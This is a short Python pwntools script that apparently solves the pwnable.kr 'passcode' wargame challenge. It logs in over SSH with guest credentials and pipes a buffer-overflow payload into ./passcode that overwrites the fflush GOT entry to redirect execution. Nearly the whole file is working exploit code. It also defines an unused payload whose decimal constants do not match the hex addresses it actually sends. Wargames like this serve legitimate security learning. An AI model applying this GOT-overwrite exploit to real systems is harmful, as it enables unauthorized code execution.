from pwn import *

fflush_adress = 338150
win_address = 13371337

payload = 96* 'A'.encode() +  p32(fflush_adress) +  str(win_address).encode()

remote = ssh("passcode", "pwnable.kr", 2222, "guest")
shell = remote.shell('/bin/bash')
remote.sendline(b"""python -c "print '\x01'*96 + '\x04\xa0\x04\x08' + '\xea\x85\x04\x08'" | ./passcode""")
remote.recvline()


